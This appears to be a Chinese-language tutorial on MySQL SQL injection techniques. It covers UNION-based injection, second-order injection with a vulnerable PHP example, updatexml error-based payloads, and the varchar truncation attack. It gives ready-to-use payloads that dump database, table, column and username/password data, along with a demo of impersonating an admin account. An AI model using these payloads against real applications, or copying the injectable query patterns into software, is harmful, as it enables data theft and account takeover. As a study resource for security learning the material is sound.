MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件之一。


SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

下面讲解mysql中的几种注入方法


  • union select联合注入

order by 3 猜列名

正确时会返回正常列名数不对则返回错误

union select 1,2,3 猜列名

version() 查询mysql的版本database() 查询数据库的名字user() 查询当前的用户@@version_compile_os 查询操作系统

在爆出的数字处写入mysql的函数查询

select * from admin where id=1 union select 1,2,database();

sql语句查询的时候会将数据库查询的返回的也带出来,这条sql语句相当与

select database()；将第三个列名起别名为当前数据库

爆表段select table_name from information_schema.tables where table_schema='数据库名'查询所有表段：group_concat(table_name)这里查询的出来的数据库名，表名可进行16进制编码


爆字段select column_name from information_schema.columns where table_name='表名'查询所有的字段：group_concat(column_name)

查询字段内容UNION SELECT 1,2,3 from [表名]查询字段里的内容group_concat()查询也是一样的union select 1,group_concat(name,0x5c,password),3,4 from StormGroup_member获取pass和name的值，0x5c是连接符

union select注入的一个小知识点：

union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中

当前xxx表中只有一个数据是admin的

用union select 注入插入一个虚拟数据到数据库中，有时可造成任意登录

  • 二次注入

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。

开发者信任数据是无害的所导致的，例如用户输入”admin' or '1'='1“ 经过转义成了”admin\' or \'1\'=\'1“

此时由于引号被转义并没有注入产生数据正常入库

但是当用户名再次被调用时（通常为SESSION信息）

<?php    $res = mysqli_query($conn,"select user from where id=1");    $row = mysqli_fetch_array($res);    $name = $row['user'];    $res = mysqli_query($conn,"select user,pass from where user='$name'");?>

当name进入SQL语句中就最终导致sql注入的产生

  • 报错注入

这里用updatexml来举例

select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

updatexml报错注入爆出了当前用户

通过查阅相关文档可知，updatexml在执行的时候，第二个参数应该是为合法的XPATH路径，否则会在引发报错的同时将执行的参数输出 不符合语法的话就会触发xml报错

而第二个参数呢是concat连接字符串，将输出的结果连接，0x7e是字符串~

利用这一特性，针对存在报错注入的例子，将我们想到的的信息传入updatexml函数的第二个的参数

报错注入

爆出其他数据库

select * from admin where id=1 and (updatexml(1,concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1),0x7e),1));

爆出当前数据库

select * from admin where id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1));

爆出test数据库中的表

select * from admin where id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='test' limit 0,1),0x7e),1));

爆出admin表中的字段

select * from admin where id=1 and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='admin' limit 0,1),0x7e),1));

爆数据

select * from admin where id=1 and (updatexml(1,concat(0x7e,(select concat(name,"---",pass) from admin limit 1,1),0x7e),1));

  • 基于约束SQL的攻击


条件是mysql的版本为5.5

一、背景介绍

在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。

如“admin”等同于“admin ”（admin后有一个空格）。

所以以下两句SQL语句查询结果一样：

SELECT * FROM users WHERE username='admin';SELECT * FROM users WHERE username='admin     ';

在INSERT查询中，如果字段定义为varchar(n)类型来限制字符串的最大长度，当字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。如字符串约束为“3”个字符时，在插入字符串为"admin"时，实际上只能插入前三个字符，即为"adm"。

基于约束的SQL攻击原理：

没有将字段设置为唯一字段，导致可以利用mysql会略去空格（前提：空格后面没有字符）这一特性，查询或插入敏感信息

二、攻击演示

创建一个test数据库，往里面插入一张user表，其中包含username和password列，限制其最大长度为15。

mysql> create database test;Query OK, 1 row affected (0.00 sec)mysql> use test;Database changedmysql> create table user(username varchar(15),password varchar(15));Query OK, 0 rows affected (0.32 sec)

向username字段插入"admin",向password字段插入"123456"。

mysql> insert into user values("admin",123456);Query OK, 1 row affected (0.00 sec)mysql> select * from user;+----------+----------+| username | password |+----------+----------+| admin    | 123456   |+----------+----------+1 row in set (0.00 sec)

我们继续向user表里插入用户名为“admin[许多空格]1”，密码为112233。

需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为15个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前15个字符。

mysql> insert into user values("admin              1",112233);Query OK, 1 row affected, 1 warning (0.00 sec)mysql> select * from user;+-----------------+----------+| username        | password |+-----------------+----------+| admin           | 123456   || admin           | 112233   |+-----------------+----------+2 rows in set (0.00 sec)


现在，如果使用用户名和密码登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。
